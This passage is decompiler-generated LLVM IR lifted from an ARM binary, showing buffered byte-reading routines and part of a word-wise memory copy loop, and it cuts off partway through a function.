  uselistorder i8* %stack_var_-46, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %tmp182, { 0, 1, 2, 5, 4, 3, 7, 6, 8 }
  uselistorder i32* %stack_var_0, { 2, 3, 0, 1 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 10, 9, 11, 13, 12, 14 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 8 }
  uselistorder i32* %r6.global-to-local, { 10, 0, 11, 1, 2, 3, 4, 5, 6, 8, 9, 7 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 19, 21, 22, 23, 24, 25, 27, 41, 28, 32, 29, 30, 31, 33, 26, 34, 35, 36, 37, 38, 39, 40, 63, 42, 43, 44, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 2, 64, 65, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 31, 30, 32, 34, 33, 35, 36, 37, 40, 38, 39, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 13, 15, 11, 16, 14, 17, 18, 37, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 6, 7, 8, 9, 38, 36, 40, 39, 10, 11, 37, 12, 13, 41, 15, 14, 16, 17, 18, 3, 19, 21, 20, 22, 42, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 2, 33, 34, 1, 35, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 60, 18, 19, 20, 21, 22, 23, 24, 25, 59, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 61, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32 ()* @function_cc44, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @function_cd70, { 0, 1, 3, 2 }
  uselistorder i32 112, { 2, 9, 0, 10, 3, 1, 11, 4, 5, 6, 7, 8 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @function_187fc, { 1, 0 }
  uselistorder i32 1104006501, { 1, 4, 0, 2, 3 }
  uselistorder i32 96, { 3, 4, 1, 2, 0 }
  uselistorder i32 (i32)* @function_187cc, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_184e0, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_187b4, { 2, 1, 0 }
  uselistorder i8 32, { 0, 1, 2, 3, 4, 7, 6, 8, 5, 11, 10, 9, 12, 13 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 2, 3, 1, 0, 4, 5 }
  uselistorder label %dec_label_pc_144b8, { 1, 0 }
  uselistorder label %dec_label_pc_14470, { 2, 0, 1 }
  uselistorder label %bb250, { 1, 0 }
  uselistorder label %dec_label_pc_143d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14348, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14318, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %dec_label_pc_142f0, { 1, 0 }
  uselistorder label %dec_label_pc_142c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_142a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14270, { 2, 1, 0 }
  uselistorder label %.thread34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_141b8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_141a8, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %bb230, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %.thread142, { 1, 0 }
  uselistorder label %._crit_edge91, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb219, { 1, 0 }
  uselistorder label %dec_label_pc_140d0, { 2, 1, 0 }
  uselistorder label %bb216, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13fdc, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_13f8c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13f84, { 1, 0 }
  uselistorder label %bb208, { 1, 0 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %dec_label_pc_13e68, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_13d84, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
  uselistorder label %bb199, { 1, 0 }
  uselistorder label %bb197, { 1, 0 }
}

define i32 @function_144f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_144f0:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_144f0 = load i32, i32* @r4, align 4
  store i32 %v3_144f0, i32* %stack_var_-16, align 4
  %v6_144f0 = load i32, i32* @r5, align 4
  %v12_144f0 = load i32, i32* @lr, align 4
  %v1_144f4 = add i32 %arg1, 52
  %v2_144f4 = inttoptr i32 %v1_144f4 to i32*
  %v3_144f4 = load i32, i32* %v2_144f4, align 4
  %v2_144fc = icmp eq i32 %v3_144f4, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 142964, i32* %r6.global-to-local, align 4
  br i1 %v2_144fc, label %dec_label_pc_14534, label %dec_label_pc_14510

dec_label_pc_14510:                               ; preds = %dec_label_pc_144f0
  %v1_14510 = add i32 %arg1, 16
  %v2_14510 = inttoptr i32 %v1_14510 to i32*
  %v3_14510 = load i32, i32* %v2_14510, align 4
  %v1_14514 = add i32 %arg1, 24
  %v2_14514 = inttoptr i32 %v1_14514 to i32*
  %v3_14514 = load i32, i32* %v2_14514, align 4
  %v3_14518 = icmp ult i32 %v3_14510, %v3_14514
  br i1 %v3_14518, label %.thread, label %dec_label_pc_14528

.thread:                                          ; preds = %dec_label_pc_14510
  %v2_1451c = inttoptr i32 %v3_14510 to i8*
  %v3_1451c = load i8, i8* %v2_1451c, align 1
  %v4_1451c = zext i8 %v3_1451c to i32
  store i32 %v4_1451c, i32* %r4.global-to-local, align 4
  %v6_1451c = add i32 %v3_14510, 1
  store i32 %v6_1451c, i32* %v2_14510, align 4
  br label %dec_label_pc_145a8

dec_label_pc_14528:                               ; preds = %dec_label_pc_14510
  %v1_14528 = inttoptr i32 %arg1 to i16*
  %v2_14528 = call i32 @function_145cc(i16* %v1_14528)
  store i32 %v2_14528, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_145a8

dec_label_pc_14534:                               ; preds = %dec_label_pc_144f0
  %v1_14538 = add i32 %arg1, 56
  store i32 %v1_14538, i32* @r4, align 4
  %v4_1454c = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  call void @__pseudo_branch(i32 %v4_1454c)
  %v0_14560 = load i32, i32* %r6.global-to-local, align 4
  %v2_14560 = add i32 %v0_14560, 16
  %v3_14560 = inttoptr i32 %v2_14560 to i32*
  %v4_14560 = load i32, i32* %v3_14560, align 4
  store i32 83308, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14560)
  %v0_1456c = load i32, i32* @r5, align 4
  %v1_1456c = add i32 %v0_1456c, 16
  %v2_1456c = inttoptr i32 %v1_1456c to i32*
  %v3_1456c = load i32, i32* %v2_1456c, align 4
  %v1_14570 = add i32 %v0_1456c, 24
  %v2_14570 = inttoptr i32 %v1_14570 to i32*
  %v3_14570 = load i32, i32* %v2_14570, align 4
  %v3_14574 = icmp ult i32 %v3_1456c, %v3_14570
  br i1 %v3_14574, label %.thread2, label %dec_label_pc_14584

.thread2:                                         ; preds = %dec_label_pc_14534
  %v2_14578 = inttoptr i32 %v3_1456c to i8*
  %v3_14578 = load i8, i8* %v2_14578, align 1
  %v4_14578 = zext i8 %v3_14578 to i32
  store i32 %v4_14578, i32* %r4.global-to-local, align 4
  %v6_14578 = add i32 %v3_1456c, 1
  store i32 %v6_14578, i32* %v2_1456c, align 4
  br label %dec_label_pc_14590

dec_label_pc_14584:                               ; preds = %dec_label_pc_14534
  %v1_14588 = inttoptr i32 %v0_1456c to i16*
  %v2_14588 = call i32 @function_145cc(i16* %v1_14588)
  store i32 %v2_14588, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14590

dec_label_pc_14590:                               ; preds = %.thread2, %dec_label_pc_14584
  %v0_1459c = load i32, i32* %r6.global-to-local, align 4
  %v2_1459c = add i32 %v0_1459c, 24
  %v3_1459c = inttoptr i32 %v2_1459c to i32*
  %v4_1459c = load i32, i32* %v3_1459c, align 4
  store i32 %v4_1459c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1459c)
  br label %dec_label_pc_145a8

dec_label_pc_145a8:                               ; preds = %.thread, %dec_label_pc_14528, %dec_label_pc_14590
  %v0_145a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_145b0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_145b0, i32* @r4, align 4
  store i32 %v6_144f0, i32* @r5, align 4
  store i32 %v12_144f0, i32* @lr, align 4
  ret i32 %v0_145a8

; uselistorder directives
  uselistorder i32 %v3_1456c, { 1, 0, 2 }
  uselistorder i32 %v3_14510, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 5, 4, 3, 0, 2 }
  uselistorder label %dec_label_pc_145a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14590, { 1, 0 }
}

define i32 @function_145bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_145bc:
  %v0_145bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_145bc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_145bc
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_145bc, %bb
  %v10_145c8 = phi i32 [ %arg1, %dec_label_pc_145bc ], [ 0, %bb ]
  ret i32 %v10_145c8

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_145cc(i16* %arg1) local_unnamed_addr {
dec_label_pc_145cc:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_145cc = load i32, i32* @r4, align 4
  store i32 %v3_145cc, i32* %stack_var_-12, align 4
  %v6_145cc = load i32, i32* @r5, align 4
  %v9_145cc = load i32, i32* @lr, align 4
  %v0_145d0 = load i32, i32* @r0, align 4
  %v1_145d0 = add i32 %v0_145d0, 16
  %v2_145d0 = inttoptr i32 %v1_145d0 to i32*
  %v3_145d0 = load i32, i32* %v2_145d0, align 4
  store i32 %v3_145d0, i32* %r2.global-to-local, align 4
  %v1_145d4 = add i32 %v0_145d0, 24
  %v2_145d4 = inttoptr i32 %v1_145d4 to i32*
  %v3_145d4 = load i32, i32* %v2_145d4, align 4
  %v3_145d8 = icmp ult i32 %v3_145d0, %v3_145d4
  store i32 %v0_145d0, i32* @r4, align 4
  br i1 %v3_145d8, label %bb, label %dec_label_pc_145f8

bb:                                               ; preds = %dec_label_pc_145cc
  %v2_145e4 = inttoptr i32 %v3_145d0 to i8*
  %v3_145e4 = load i8, i8* %v2_145e4, align 1
  %v4_145e4 = zext i8 %v3_145e4 to i32
  store i32 %v4_145e4, i32* %r0.global-to-local, align 4
  %v6_145e4 = add i32 %v3_145d0, 1
  store i32 %v6_145e4, i32* %r2.global-to-local, align 4
  store i32 %v6_145e4, i32* %v2_145d0, align 4
  br label %dec_label_pc_146e4

dec_label_pc_145f8:                               ; preds = %dec_label_pc_145cc
  store i32 142964, i32* @r5, align 4
  %v1_145f8 = inttoptr i32 %v0_145d0 to i16*
  %v2_145f8 = load i16, i16* %v1_145f8, align 2
  %v3_145f8 = zext i16 %v2_145f8 to i32
  %v1_145fc = and i32 %v3_145f8, 131
  %tmp24 = icmp ugt i32 %v1_145fc, 128
  br i1 %tmp24, label %dec_label_pc_14618, label %dec_label_pc_14608

dec_label_pc_14608:                               ; preds = %dec_label_pc_145f8
  store i32 128, i32* @r1, align 4
  %v0_1460c = call i32 @function_15de4()
  store i32 %v0_1460c, i32* %r0.global-to-local, align 4
  %v2_14610 = icmp eq i32 %v0_1460c, 0
  br i1 %v2_14610, label %dec_label_pc_14608.dec_label_pc_14618_crit_edge, label %dec_label_pc_146e0

dec_label_pc_14608.dec_label_pc_14618_crit_edge:  ; preds = %dec_label_pc_14608
  %v0_14618.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14618

dec_label_pc_14618:                               ; preds = %dec_label_pc_14608.dec_label_pc_14618_crit_edge, %dec_label_pc_145f8
  %v2_14658 = phi i32 [ %v0_14618.pre, %dec_label_pc_14608.dec_label_pc_14618_crit_edge ], [ %v0_145d0, %dec_label_pc_145f8 ]
  %v1_14618 = inttoptr i32 %v2_14658 to i16*
  %v2_14618 = load i16, i16* %v1_14618, align 2
  %v3_14618 = zext i16 %v2_14618 to i32
  store i32 %v3_14618, i32* %r2.global-to-local, align 4
  %v1_1461c = and i32 %v3_14618, 2
  %v2_1461c = icmp eq i32 %v1_1461c, 0
  br i1 %v2_1461c, label %dec_label_pc_14648, label %dec_label_pc_14624

dec_label_pc_14624:                               ; preds = %dec_label_pc_14618
  %tmp25 = urem i16 %v2_14618, 2
  %v1_14624 = zext i16 %tmp25 to i32
  %tmp21 = sub nsw i32 0, %v1_14624
  %v4_14628 = and i32 %tmp21, 4
  %v5_14628 = add i32 %v4_14628, %v2_14658
  %v1_1462c = add i32 %v5_14628, 36
  %v2_1462c = inttoptr i32 %v1_1462c to i8*
  %v3_1462c = load i8, i8* %v2_1462c, align 1
  %v4_1462c = zext i8 %v3_1462c to i32
  %v1_14630 = add nsw i32 %v3_14618, -1
  store i32 %v1_14630, i32* %r2.global-to-local, align 4
  store i32 %v4_1462c, i32* %r0.global-to-local, align 4
  %v2_1463c = add i32 %v2_14658, 40
  %v3_1463c = inttoptr i32 %v2_1463c to i32*
  store i32 0, i32* %v3_1463c, align 4
  %v0_14640 = load i32, i32* %r2.global-to-local, align 4
  %v1_14640 = trunc i32 %v0_14640 to i16
  %v2_14640 = load i32, i32* @r4, align 4
  %v3_14640 = inttoptr i32 %v2_14640 to i16*
  store i16 %v1_14640, i16* %v3_14640, align 2
  br label %dec_label_pc_146e4

dec_label_pc_14648:                               ; preds = %dec_label_pc_14618
  %v1_14648 = add i32 %v2_14658, 16
  %v1_1464c = inttoptr i32 %v1_14648 to i32*
  %v2_1464c = load i32, i32* %v1_1464c, align 4
  %v3_1464c = add i32 %v2_14658, 20
  %v4_1464c = inttoptr i32 %v3_1464c to i32*
  %v5_1464c = load i32, i32* %v4_1464c, align 4
  %v9_14650 = icmp eq i32 %v5_1464c, %v2_1464c
  br i1 %v9_14650, label %dec_label_pc_14660, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_14648
  %v2_14654 = inttoptr i32 %v2_1464c to i8*
  %v3_14654 = load i8, i8* %v2_14654, align 1
  %v4_14654 = zext i8 %v3_14654 to i32
  store i32 %v4_14654, i32* %r0.global-to-local, align 4
  %v6_14654 = add i32 %v2_1464c, 1
  store i32 %v6_14654, i32* %v1_1464c, align 4
  br label %dec_label_pc_146e4

dec_label_pc_14660:                               ; preds = %dec_label_pc_14648
  %v1_14660 = add i32 %v2_14658, 4
  %v2_14660 = inttoptr i32 %v1_14660 to i32*
  %v3_14660 = load i32, i32* %v2_14660, align 4
  %v7_14664 = icmp eq i32 %v3_14660, -2
  br i1 %v7_14664, label %.thread8, label %dec_label_pc_14678

.thread8:                                         ; preds = %dec_label_pc_14660
  %v2_14668 = or i16 %v2_14618, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_14668, i16* %v1_14618, align 2
  br label %dec_label_pc_146e4

dec_label_pc_14678:                               ; preds = %dec_label_pc_14660
  %v1_14678 = and i32 %v3_14618, 768
  %v2_14678 = icmp eq i32 %v1_14678, 0
  br i1 %v2_14678, label %.thread10, label %bb22

bb22:                                             ; preds = %dec_label_pc_14678
  %v1_14680 = load i32, i32* @r5, align 4
  %v3_14680 = add i32 %v1_14680, 48
  %v4_14680 = inttoptr i32 %v3_14680 to i32*
  %v5_14680 = load i32, i32* %v4_14680, align 4
  store i32 %v5_14680, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_14678, %bb22
  %v1_14684 = xor i1 %v2_14678, true
  call void @__pseudo_cond_branch(i1 %v1_14684, i32 ptrtoint (i32* @global_var_f134.267 to i32))
  %v0_14688 = load i32, i32* @r4, align 4
  %v1_14688 = add i32 %v0_14688, 8
  store i32 %v1_14688, i32* %r2.global-to-local, align 4
  %v1_1468c = inttoptr i32 %v1_14688 to i32*
  %v2_1468c = load i32, i32* %v1_1468c, align 4
  store i32 %v2_1468c, i32* %r2.global-to-local, align 4
  %v3_1468c = add i32 %v0_14688, 12
  %v4_1468c = inttoptr i32 %v3_1468c to i32*
  %v5_1468c = load i32, i32* %v4_1468c, align 4
  %v9_14690 = icmp eq i32 %v5_1468c, %v2_1468c
  br i1 %v9_14690, label %dec_label_pc_146c4, label %dec_label_pc_14698

dec_label_pc_14698:                               ; preds = %.thread10
  %v2_14698 = add i32 %v0_14688, 24
  %v3_14698 = inttoptr i32 %v2_14698 to i32*
  store i32 %v2_1468c, i32* %v3_14698, align 4
  %v0_1469c = load i32, i32* @r4, align 4
  store i32 %v0_1469c, i32* %r0.global-to-local, align 4
  %v2_146a0 = call i32 @function_15db4(i32 %v0_1469c)
  store i32 %v2_146a0, i32* %r0.global-to-local, align 4
  %v2_146a4 = icmp eq i32 %v2_146a0, 0
  br i1 %v2_146a4, label %dec_label_pc_146e0, label %dec_label_pc_146ac

dec_label_pc_146ac:                               ; preds = %dec_label_pc_14698
  %v0_146ac = load i32, i32* @r4, align 4
  %v1_146ac = add i32 %v0_146ac, 20
  %v2_146ac = inttoptr i32 %v1_146ac to i32*
  %v3_146ac = load i32, i32* %v2_146ac, align 4
  %v2_146b0 = add i32 %v0_146ac, 24
  %v3_146b0 = inttoptr i32 %v2_146b0 to i32*
  store i32 %v3_146ac, i32* %v3_146b0, align 4
  %v0_146b4 = load i32, i32* @r4, align 4
  %v1_146b4 = add i32 %v0_146b4, 16
  %v2_146b4 = inttoptr i32 %v1_146b4 to i32*
  %v3_146b4 = load i32, i32* %v2_146b4, align 4
  %v1_146b8 = inttoptr i32 %v3_146b4 to i8*
  %v2_146b8 = load i8, i8* %v1_146b8, align 1
  %v3_146b8 = zext i8 %v2_146b8 to i32
  store i32 %v3_146b8, i32* %r0.global-to-local, align 4
  %v5_146b8 = add i32 %v3_146b4, 1
  store i32 %v5_146b8, i32* %v2_146b4, align 4
  br label %dec_label_pc_146e4

dec_label_pc_146c4:                               ; preds = %.thread10
  %v1_146c4 = inttoptr i32 %v0_14688 to i16*
  store i32 %v0_14688, i32* %r0.global-to-local, align 4
  %v2_146c8 = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_146d0 = call i32 @function_15c98(i16* %v1_146c4, i32 %v2_146c8, i32 1)
  store i32 %v5_146d0, i32* %r0.global-to-local, align 4
  %v2_146d4 = icmp eq i32 %v5_146d0, 0
  br i1 %v2_146d4, label %dec_label_pc_146e0, label %bb23

bb23:                                             ; preds = %dec_label_pc_146c4
  %v4_146d8 = load i8, i8* %stack_var_-17, align 1
  %v5_146d8 = sext i8 %v4_146d8 to i32
  store i32 %v5_146d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_146e4

dec_label_pc_146e0:                               ; preds = %dec_label_pc_146c4, %dec_label_pc_14608, %dec_label_pc_14698
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_146e4

dec_label_pc_146e4:                               ; preds = %bb, %.thread8, %bb23, %.thread5, %dec_label_pc_146ac, %dec_label_pc_14624, %dec_label_pc_146e0
  %v2_146e8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_146e8, i32* @r4, align 4
  store i32 %v6_145cc, i32* @r5, align 4
  store i32 %v9_145cc, i32* @lr, align 4
  %v1_146ec = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_146ec

; uselistorder directives
  uselistorder i32 %v2_1464c, { 1, 0, 2 }
  uselistorder i32 %v2_14658, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_145d0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_145d0, { 1, 0, 2, 3, 4 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 12, 3, 4, 0, 5, 6, 2, 7, 8, 9, 10, 11, 1, 13 }
  uselistorder label %dec_label_pc_146e4, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_146e0, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_14700(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14700:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_14700 = load i32, i32* %r1.global-to-local, align 4
  %v1_14700 = load i32, i32* %r0.global-to-local, align 4
  %v2_14700 = sub i32 %v0_14700, %v1_14700
  %v3_14700 = icmp ult i32 %v0_14700, %v1_14700
  %v4_14700 = xor i32 %v1_14700, %v0_14700
  %v5_14700 = xor i32 %v2_14700, %v0_14700
  %v6_14700 = and i32 %v5_14700, %v4_14700
  %v7_14700 = icmp slt i32 %v6_14700, 0
  store i1 %v7_14700, i1* %cpsr_v.global-to-local, align 1
  %v8_14700 = icmp slt i32 %v2_14700, 0
  store i1 %v8_14700, i1* %cpsr_n.global-to-local, align 1
  %v9_14700 = icmp eq i32 %v0_14700, %v1_14700
  store i1 %v9_14700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14700, label %dec_label_pc_14954, label %dec_label_pc_14708

dec_label_pc_14708:                               ; preds = %dec_label_pc_14700
  br i1 %v9_14700, label %.thread130, label %bb

.thread130:                                       ; preds = %bb154, %.thread129, %bb151, %dec_label_pc_14708
  %merge = phi i32 [ %v0_14700, %dec_label_pc_14708 ], [ %v2_149e8, %bb151 ], [ %v11_14a04, %bb154 ], [ %v7_14a04, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_14708
  %v5_1470c = inttoptr i32 %v1_14700 to i8*
  store i8* %v5_1470c, i8** %stack_var_-8, align 4
  %v8_1470c = load i32, i32* @lr, align 4
  %v0_14710 = load i32, i32* @r2, align 4
  %v2_14710 = add i32 %v0_14710, -4
  store i32 %v2_14710, i32* %r2.global-to-local, align 4
  %v4_14710 = sub i32 3, %v0_14710
  %v5_14710 = and i32 %v4_14710, %v0_14710
  %v6_14710 = icmp slt i32 %v5_14710, 0
  store i1 %v6_14710, i1* %cpsr_v.global-to-local, align 1
  %v7_14710 = icmp slt i32 %v2_14710, 0
  store i1 %v7_14710, i1* %cpsr_n.global-to-local, align 1
  %v8_14710 = icmp eq i32 %v0_14710, 4
  store i1 %v8_14710, i1* %cpsr_z.global-to-local, align 1
  %v5_14714 = icmp slt i32 %v0_14710, 4
  br i1 %v5_14714, label %bb141, label %dec_label_pc_14718

dec_label_pc_14718:                               ; preds = %bb
  %v1_14718 = urem i32 %v1_14700, 4
  store i32 %v1_14718, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14718 = icmp eq i32 %v1_14718, 0
  store i1 %v2_14718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14718, label %dec_label_pc_14720, label %dec_label_pc_147cc

dec_label_pc_14720:                               ; preds = %dec_label_pc_14718
  %v1_14720 = urem i32 %v0_14700, 4
  store i32 %v1_14720, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14720 = icmp eq i32 %v1_14720, 0
  store i1 %v2_14720, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_14700 to i2
  br i1 %v2_14720, label %dec_label_pc_14728, label %dec_label_pc_147fc

dec_label_pc_14728:                               ; preds = %dec_label_pc_14720, %dec_label_pc_147f4
  %v0_1474094 = phi i32 [ %v1_14700, %dec_label_pc_14720 ], [ %v0_1491c77, %dec_label_pc_147f4 ]
  %v0_1473c93 = phi i32 [ %v0_14700, %dec_label_pc_14720 ], [ %v0_147f4, %dec_label_pc_147f4 ]
  %v0_14728 = phi i32 [ %v2_14710, %dec_label_pc_14720 ], [ %v2_147ec, %dec_label_pc_147f4 ]
  %v1_14728 = add i32 %v0_14728, -8
  store i32 %v1_14728, i32* %r2.global-to-local, align 4
  %v3_14728 = sub i32 7, %v0_14728
  %v4_14728 = and i32 %v3_14728, %v0_14728
  %v5_14728 = icmp slt i32 %v4_14728, 0
  store i1 %v5_14728, i1* %cpsr_v.global-to-local, align 1
  %v6_14728 = icmp slt i32 %v1_14728, 0
  store i1 %v6_14728, i1* %cpsr_n.global-to-local, align 1
  %v7_14728 = icmp eq i32 %v0_14728, 8
  store i1 %v7_14728, i1* %cpsr_z.global-to-local, align 1
  %v2_1472c = xor i1 %v6_14728, %v5_14728
  br i1 %v2_1472c, label %dec_label_pc_1477c, label %dec_label_pc_14730

dec_label_pc_14730:                               ; preds = %dec_label_pc_14728
  %v1_14730 = add i32 %v0_14728, -28
  store i32 %v1_14730, i32* %r2.global-to-local, align 4
  %v3_14730 = sub i32 27, %v0_14728
  %v4_14730 = and i32 %v3_14730, %v1_14728
  %v5_14730 = icmp slt i32 %v4_14730, 0
  store i1 %v5_14730, i1* %cpsr_v.global-to-local, align 1
  %v6_14730 = icmp slt i32 %v1_14730, 0
  store i1 %v6_14730, i1* %cpsr_n.global-to-local, align 1
  %v7_14730 = icmp eq i32 %v1_14728, 20
  store i1 %v7_14730, i1* %cpsr_z.global-to-local, align 1
  %v2_14734 = xor i1 %v6_14730, %v5_14730
  br i1 %v2_14734, label %dec_label_pc_14768, label %dec_label_pc_14738

dec_label_pc_14738:                               ; preds = %dec_label_pc_14730
  %v0_14738 = load i32, i32* @r4, align 4
  store i32 %v0_14738, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1473c

dec_label_pc_1473c:                               ; preds = %dec_label_pc_1473c.dec_label_pc_1473c_crit_edge, %dec_label_pc_14738
  %v0_14740 = phi i32 [ %v12_14748, %dec_label_pc_1473c.dec_label_pc_1473c_crit_edge ], [ %v0_1474094, %dec_label_pc_14738 ]
  %v0_1473c = phi i32 [ %v0_1473c.pre, %dec_label_pc_1473c.dec_label_pc_1473c_crit_edge ], [ %v0_1473c93, %dec_label_pc_14738 ]
  %v1_1473c = inttoptr i32 %v0_1473c to i32*
  %v2_1473c = load i32, i32* %v1_1473c, align 4
  %v3_1473c = add i32 %v0_1473c, 4
  %v4_1473c = inttoptr i32 %v3_1473c to i32*
  %v5_1473c = load i32, i32* %v4_1473c, align 4
  store i32 %v5_1473c, i32* %r4.global-to-local, align 4
  %v6_1473c = add i32 %v0_1473c, 8
  %v7_1473c = inttoptr i32 %v6_1473c to i32*
  %v8_1473c = load i32, i32* %v7_1473c, align 4
  store i32 %v8_1473c, i32* %ip.global-to-local, align 4
  %v9_1473c = add i32 %v0_1473c, 12
  %v10_1473c = inttoptr i32 %v9_1473c to i32*
  %v11_1473c = load i32, i32* %v10_1473c, align 4
  store i32 %v11_1473c, i32* %lr.global-to-local, align 4
  %v12_1473c = add i32 %v0_1473c, 16
  store i32 %v12_1473c, i32* %r1.global-to-local, align 4
  %v1_14740 = inttoptr i32 %v0_14740 to i32*
  store i32 %v2_1473c, i32* %v1_14740, align 4
  %v3_14740 = add i32 %v0_14740, 4
  %v4_14740 = inttoptr i32 %v3_14740 to i32*
  %v5_14740 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14740, i32* %v4_14740, align 4
  %v6_14740 = add i32 %v0_14740, 8
  %v7_14740 = inttoptr i32 %v6_14740 to i32*
  %v8_14740 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_14740, i32* %v7_14740, align 4
  %v9_14740 = add i32 %v0_14740, 12
